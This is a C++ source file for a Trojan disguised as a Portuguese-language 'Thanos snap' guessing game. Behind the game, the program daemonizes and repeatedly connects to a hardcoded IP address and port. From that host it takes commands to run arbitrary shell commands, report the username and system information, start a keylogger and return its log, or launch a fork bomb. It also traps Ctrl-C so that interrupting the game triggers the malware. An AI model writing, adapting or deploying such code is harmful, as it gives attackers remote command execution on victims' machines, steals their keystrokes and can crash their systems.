#include "keylogger.hpp"
#include "common.hpp"

#include <iostream>
#include <chrono>
#include <string>
#include <thread>

#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <signal.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/mman.h>

#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>

constexpr int MAXBUFFSIZE = 1024;

std::string home_addr = "3.22.53.161";
std::string home_port = "16622";

std::string name;
char original_executable_path[MAXBUFFSIZE];
int stop = 0;

std::string run_module(int sock, Acao a)
{
	switch (a) {
		case GetUsername:
			{
				char *username = getenv("USER");
				return std::string(username);
			}
		case GetSysInfo:
			{
				FILE *command_pipe = popen("uname -a", "r");

				char command_output[64];
				std::string result;
				while (fgets(command_output, 64, command_pipe)) {
					result += command_output;
				}
				pclose(command_pipe);
				return result;
			}
		case Exec:
			{
				char data[MAXBUFFSIZE];
				recv(sock, data, MAXBUFFSIZE, 0);
				if (strlen(data) == 0) break;

				FILE *command_pipe = popen(data, "r");

				char command_output[64];
				std::string result;
				while (fgets(command_output, 64, command_pipe)) {
					result += command_output;
				}

				pclose(command_pipe);
				return result;
			}
		case StartKeylogger:
			{
				Keylogger::start();
				return "Success!";
			}
		case StopKeylogger:
			{
				Keylogger::stop();
				return "Success!";
			}
		case GetKeylog:
			{
				return Keylogger::get();
			}
		case Forkbomb:
			{
				std::string output("Success!");
				send(sock, output.c_str(), output.size(), 0);
				while (1) fork();
				break;
			}
		default:
			break;
	}
	return "";
}

void handle_connection_to_home(int sock)
{
	uint8_t acao = -1;

	while (recv(sock, &acao, 1, 0))
	{
		std::string output = run_module(sock, static_cast<Acao>(acao));
		send(sock, output.c_str(), output.size(), 0);
		acao = -1;
	}

	close(sock);
}

bool tentar_conectar(int sock)
{
	addrinfo server, *results;
	server.ai_family = AF_INET;
	server.ai_socktype = SOCK_STREAM;
	getaddrinfo(home_addr.c_str(), home_port.c_str(), &server, &results);
	if (results) {
		auto status = connect(sock, results->ai_addr, results->ai_addrlen);
		freeaddrinfo(results);
		return status == 0;
	}
	return false;
}

void malware()
{
	daemon(0, 0);

	while (!stop) {
		using namespace std::chrono_literals;
		std::this_thread::sleep_for(5s);

		int sock = socket(PF_INET, SOCK_STREAM, 0);
		if (tentar_conectar(sock)) {
			handle_connection_to_home(sock);
		}
	}

	exit(0);
}

void signal_handling(int _)
{
	malware();
}

void game()
{
	srand(time(NULL));

	std::cout << "Oh não! O Thanos estalou os dedos de novo!\n";
	std::cout << "Descubra se você virou PÓ!\n";
	std::cout << "Coloque seu nome aqui: ";
	std::getline(std::cin, name);

	int numero = rand() % 2;
	if (numero == 0)
	{
		std::cout << "\nEita, " << name << ". você virou PÓ!\n";
	}
	else
	{
		std::cout << "\nSussa, " << name << ". você não virou PÓ!\n";
	}
}

int main(int argc, char** argv)
{
	if (argc != 1) malware();

	signal(SIGINT, signal_handling);
	signal(SIGQUIT, signal_handling);

	game();

	malware();
}

